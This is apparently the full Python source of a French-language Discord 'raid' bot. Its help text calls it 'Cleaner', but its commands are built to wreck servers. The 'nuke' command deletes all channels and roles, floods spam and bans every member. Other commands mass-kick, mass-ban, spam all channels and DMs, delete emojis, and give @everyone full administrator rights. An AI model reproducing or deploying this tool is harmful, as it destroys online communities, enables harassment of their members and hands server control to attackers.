import discord
import asyncio
import json
import random
from discord.ext import commands
from discord import Permissions

# Charger la configuration
with open("config.json", "r", encoding="utf-8") as f:
    config = json.load(f)

intents = discord.Intents.all()
client = commands.Bot(command_prefix=config["prefix"], intents=intents, help_command=None)
client.remove_command("help")

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name=config["status"]))
    print(f''' 

██████╗ ██████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗╚════██╗██║  ██║██╔════╝██╔══██╗
██║  ██║ █████╔╝███████║█████╗  ██████╔╝
██║  ██║ ╚═══██╗╚════██║██╔══╝  ██╔══██╗
██████╔╝██████╔╝     ██║██║     ██║  ██║
╚═════╝ ╚═════╝      ╚═╝╚═╝     ╚═╝  ╚═╝

═══════════════════════════
Connecter avec {client.user}
34Press | Bot RAID
Developper par d34fr | Déa
Prefix : *
═══════════════════════════
''')

############################## COMMANDES ##############################

@client.command()
async def nuke(ctx, amount=50):
    await ctx.message.delete()
    await ctx.guild.edit(name=config["nuke_server_name"])
    print("🚨 Début du nuke...")

    # Supprimer les salons
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print(f"✅ Salon supprimé : {channel.name}")
        except:
            print(f"❌ Salon non supprimé : {channel.name}")

    # Créer de nouveaux salons
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(config["channel_names"]))
            print(f"✅ Salon créé {i}")
        except:
            print(f"❌ Salon non créé {i}")

    # Supprimer les rôles
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"✅ Rôle supprimé : {role.name}")
        except:
            print(f"❌ Rôle non supprimé : {role.name}")

    # Spam + ban
    await asyncio.sleep(2)
    for _ in range(3):
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(random.choice(config["message_spam"]))
            except:
                pass

    for member in ctx.guild.members:
        if member.id != ctx.author.id:
            try:
                await member.ban(reason=config["ban_reason"])
                print(f"✅ Banni : {member.name}")
            except:
                print(f"❌ Impossible de bannir : {member.name}")

@client.command()
async def spam(ctx, num: int, *, message: str):
    await ctx.message.delete()
    for _ in range(num):
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(message)
            except:
                pass

@client.command()
async def ed(ctx):
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"✅ Emoji supprimé : {emoji.name}")
        except:
            print(f"❌ Emoji non supprimé : {emoji.name}")

@client.command()
async def mc(ctx, amount=50):
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(config["channel_names"]))
            print(f"✅ Salon créé : {i}")
        except:
            print(f"❌ Salon non créé : {i}")

@client.command()
async def mr(ctx, amount=50):
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=config["role_spam_name"])
            print(f"✅ Rôle créé : {i}")
        except:
            print(f"❌ Rôle non créé : {i}")

@client.command()
async def dc(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print(f"✅ Salon supprimé : {channel.name}")
        except:
            print(f"❌ Salon non supprimé : {channel.name}")

    try:
        await ctx.guild.create_text_channel(config["final_channel_name"])
        print(f"✅ Salon final créé : {config['final_channel_name']}")
    except:
        print(f"❌ Salon final non créé")

@client.command()
async def dr(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"✅ Rôle supprimé : {role.name}")
        except:
            print(f"❌ Rôle non supprimé : {role.name}")

@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != ctx.author.id:
            try:
                await member.ban(reason=config["ban_reason"])
                print(f"✅ Banni : {member.name}")
            except:
                print(f"❌ Ban échoué : {member.name}")

@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != ctx.author.id:
            try:
                await member.kick(reason=config["kick_reason"])
                print(f"✅ Kick : {member.name}")
            except:
                print(f"❌ Kick échoué : {member.name}")

@client.command()
async def rename(ctx, *, name):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            print(f"✅ Renommé : {member}")
        except:
            print(f"❌ Échec rename : {member}")

@client.command()
async def admin(ctx):
    await ctx.message.delete()
    everyone = discord.utils.get(ctx.guild.roles, name="@everyone")
    try:
        await everyone.edit(permissions=Permissions.all())
        print(f"✅ Admin donné à @everyone")
    except:
        print(f"❌ Échec de donner admin")

@client.command()
async def dm(ctx, *, message):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.send(message)
            print(f"✅ DM envoyé à {member.name}")
        except:
            print(f"❌ DM échoué à {member.name}")

@client.command()
async def create(ctx, name):
    await ctx.message.delete()
    try:
        await ctx.guild.create_role(name=name, permissions=Permissions.all(), mentionable=True)
        print(f"✅ Rôle {name} créé avec permissions admin")
    except:
        print(f"❌ Création du rôle échouée")

@client.command()
async def add(ctx, user: discord.Member, role: discord.Role):
    await ctx.message.delete()
    try:
        await user.add_roles(role)
        print(f"✅ Rôle {role.name} ajouté à {user.name}")
    except:
        print(f"❌ Ajout échoué")

@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Cleaner 🧹🧼 | Aide", color=14177041)
    embed.add_field(name="Commandes", value="""
`*nuke` - Destruction du serveur
`*spam [nb] [msg]` - Spam dans tous les salons
`*ed` - Supprime tous les emojis
`*mc` - Crée plusieurs salons
`*mr` - Crée plusieurs rôles
`*dc` - Supprime tous les salons
`*dr` - Supprime tous les rôles
`*banall` - Ban tous les membres
`*kickall` - Kick tous les membres
`*rename [nom]` - Renomme tous les membres
`*admin` - Donne l'admin à tout le monde
`*dm [msg]` - Envoie un DM à tous
`*create [nom]` - Crée un rôle admin
`*add [membre] [rôle]` - Ajoute un rôle
""", inline=False)
    await ctx.send(embed=embed)

######################### Lancer le bot #########################

client.run(config["token"])
